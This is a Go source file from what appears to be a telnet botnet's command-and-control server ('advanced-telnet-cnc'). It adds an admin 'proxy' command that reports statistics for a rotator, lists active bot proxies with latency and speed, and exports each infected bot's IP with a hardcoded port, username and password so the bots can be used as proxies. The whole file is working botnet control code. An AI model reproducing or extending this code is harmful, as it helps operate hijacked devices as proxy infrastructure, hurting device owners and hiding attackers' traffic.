package admin

import (
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/master/command"
	"advanced-telnet-cnc/source/master/proxy"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"fmt"
	"time"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"proxy"},
		Description: "Manage the built-in proxy rotator and view proxy statistics.",
		Admin:       true,
		Usage: []command.Argument{
			{Name: "stats|list|export", Optional: true},
		},
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			if len(args) == 0 || args[0] == "stats" {
				pCount, cCount := proxy.GetStats()
				proxies := proxy.GetList()

				var avgPing time.Duration
				if len(proxies) > 0 {
					var totalPing time.Duration
					var activeCount int
					for _, v := range proxies {
						if v.Ping > 0 {
							totalPing += v.Ping
							activeCount++
						}
					}
					if activeCount > 0 {
						avgPing = totalPing / time.Duration(activeCount)
					}
				}

				session.Print(fmt.Sprintf("%s┌────────────────────────────────────────┐\r\n", config.Cyan))
				session.Print(fmt.Sprintf("%s│            PROXY STATISTICS            │\r\n", config.Cyan))
				session.Print(fmt.Sprintf("%s├────────────────────────────────────────┤\r\n", config.Cyan))
				session.Print(fmt.Sprintf("%s│ Active Proxies:    %-19d │\r\n", config.Cyan, pCount))
				session.Print(fmt.Sprintf("%s│ Active Connections: %-19d │\r\n", config.Cyan, cCount))
				session.Print(fmt.Sprintf("%s│ Avg. Latency:      %-19v │\r\n", config.Cyan, avgPing))
				session.Print(fmt.Sprintf("%s│ Rotator Address:   %-19s │\r\n", config.Cyan, proxy.RotatorAddr))
				session.Print(fmt.Sprintf("%s└────────────────────────────────────────┘\r\n", config.Cyan))
				return nil
			}

			if args[0] == "list" {
				proxies := proxy.GetList()

				if len(proxies) == 0 {
					session.Println(config.Red, "No active proxies found.")
					return nil
				}

				var totalPing time.Duration
				var activeCount int

				session.Println(config.Yellow, "Active bot proxies:")
				for _, v := range proxies {
					color := config.Green
					if v.Ping == 0 {
						color = config.Gray
					} else if v.Ping > 500*time.Millisecond {
						color = config.Red
					} else if v.Ping > 200*time.Millisecond {
						color = config.Yellow
					}

					if v.Ping > 0 {
						totalPing += v.Ping
						activeCount++
					}

					speed := "N/A"
					if v.LastSpeed != "" {
						speed = v.LastSpeed + " Mbps"
					}
					session.Print(fmt.Sprintf("%s -> %-15s | Latency: %s%v\x1b[0m | Speed: %s%s\x1b[0m\r\n", config.Gray, v.Country, color, v.Ping, config.Cyan, speed))
				}

				if activeCount > 0 {
					avgPing := totalPing / time.Duration(activeCount)
					session.Print(fmt.Sprintf("\r\n%sOverall Latency: %s%v\x1b[0m\r\n", config.Yellow, config.Green, avgPing))
				}

				return nil
			}

			if args[0] == "export" {
				proxies := proxy.GetList()

				if len(proxies) == 0 {
					session.Println(config.Red, "No active proxies to export.")
					return nil
				}

				for _, bot := range proxies {
					// Format: ip:port:username:password
					session.Print(fmt.Sprintf("%s%s:26721:Tadashi:3Wb5WfDEblAOkD0xF3OTPmxWe6cmsR\r\n", config.White, bot.IP))
				}
				return nil
			}

			session.Println(config.Red, "Usage: proxy [stats|list|export]")
			return nil
		},
	})
}
